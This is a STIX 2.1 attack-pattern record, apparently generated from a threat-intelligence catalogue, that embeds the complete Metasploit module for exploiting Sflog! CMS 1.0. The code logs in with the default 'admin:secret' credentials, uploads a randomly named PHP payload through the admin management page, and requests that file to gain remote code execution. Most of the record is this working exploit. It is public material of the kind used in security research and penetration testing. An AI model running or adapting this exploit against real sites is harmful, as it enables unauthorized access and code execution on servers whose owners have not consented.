{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0dc9dd76-c06c-4412-9aa3-5ab87503888e",
    "created": "2024-08-14T17:11:47.440179Z",
    "modified": "2024-08-14T17:11:47.440183Z",
    "name": "\"Sflog! CMS 1.0 Arbitrary File Upload Vulnerability\"",
    "description": " This module exploits multiple design flaws in Sflog 1.0.  By default, the CMS has a default admin credential of \"admin:secret\", which can be abused to access administrative features such as blogs management.  Through the management interface, we can upload a backdoor that's accessible by any remote user, and then gain arbitrary code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/sflog_upload_exec.rb",
            "external_id": "sflog_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Sflog! CMS 1.0 Arbitrary File Upload Vulnerability\",\n      'Description'    => %q{\n        This module exploits multiple design flaws in Sflog 1.0.  By default, the CMS has\n        a default admin credential of \"admin:secret\", which can be abused to access\n        administrative features such as blogs management.  Through the management\n        interface, we can upload a backdoor that's accessible by any remote user, and then\n        gain arbitrary code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'dun',    # Discovery, PoC\n          'sinn3r'  # Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '83767'],\n          ['EDB', '19626']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'Platform'       => %w{ linux php },\n      'Targets'        =>\n        [\n        [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' }  ],\n        [ 'Linux x86'            , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-07-06',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base directory to sflog!', '/sflog/']),\n        OptString.new('USERNAME',  [true, 'The username to login with', 'admin']),\n        OptString.new('PASSWORD',  [true, 'The password to login with', 'secret'])\n      ])\n  end\n\n\n  def check\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    base = File.dirname(\"#{uri}.\")\n\n    res = send_request_raw({'uri'=>\"#{base}/index.php\"})\n\n    if not res\n      return Exploit::CheckCode::Unknown\n    elsif res and res.body =~ /\\<input type\\=\\\"hidden\\\" name\\=\\\"sitesearch\\\" value\\=\\\"www\\.thebonnotgang\\.com\\/sflog/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  #\n  # login unfortunately is needed, because we need to make sure blogID is set, and the upload\n  # script (uploadContent.inc.php) doesn't actually do that, even though we can access it\n  # directly.\n  #\n  def do_login(base)\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => \"#{base}/admin/login.php\",\n      'vars_post' => {\n        'userID'   => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      }\n    })\n\n    if res and res.get_cookies.include?('PHPSESSID') and res.body !~ /\\<i\\>Access denied\\!\\<\\/i\\>/\n      return res.get_cookies\n    else\n      return ''\n    end\n  end\n\n\n  #\n  # Upload our payload, and then execute it.\n  #\n  def upload_exec(cookie, base, php_fname, p)\n    data = Rex::MIME::Message.new\n    data.add_part('download', nil, nil, \"form-data; name=\\\"blogID\\\"\")\n    data.add_part('7', nil, nil, \"form-data; name=\\\"contentType\\\"\")\n    data.add_part('3000', nil, nil, \"form-data; name=\\\"MAX_FILE_SIZE\\\"\")\n    data.add_part(p, 'text/plain', nil, \"form-data; name=\\\"fileID\\\"; filename=\\\"#{php_fname}\\\"\")\n\n    post_data = data.to_s\n\n    print_status(\"Uploading payload (#{p.length.to_s} bytes)...\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => \"#{base}/admin/manage.php\",\n      'ctype'  => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'   => post_data,\n      'cookie' => cookie,\n      'headers' => {\n        'Referer' => \"http://#{rhost}#{base}/admin/manage.php\",\n        'Origin'  => \"http://#{rhost}\"\n      }\n    })\n\n    if not res\n      print_error(\"No response from host\")\n      return\n    end\n\n    target_path = \"#{base}/blogs/download/uploads/#{php_fname}\"\n    print_status(\"Requesting '#{target_path}'...\")\n    res = send_request_raw({'uri'=>target_path})\n    if res and res.code == 404\n      print_error(\"Upload unsuccessful: #{res.code.to_s}\")\n      return\n    end\n\n    handler\n  end\n\n\n  def exploit\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    base = File.dirname(\"#{uri}.\")\n\n    print_status(\"Attempt to login as '#{datastore['USERNAME']}:#{datastore['PASSWORD']}'\")\n    cookie = do_login(base)\n\n    if cookie.empty?\n      print_error(\"Unable to login\")\n      return\n    end\n\n    php_fname =  \"#{Rex::Text.rand_text_alpha(5)}.php\"\n\n    p = get_write_exec_payload(:unlink_self=>true)\n    upload_exec(cookie, base, php_fname, p)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-06",
    "x_mitre_platforms": [
        "%w{ linux php }"
    ]
}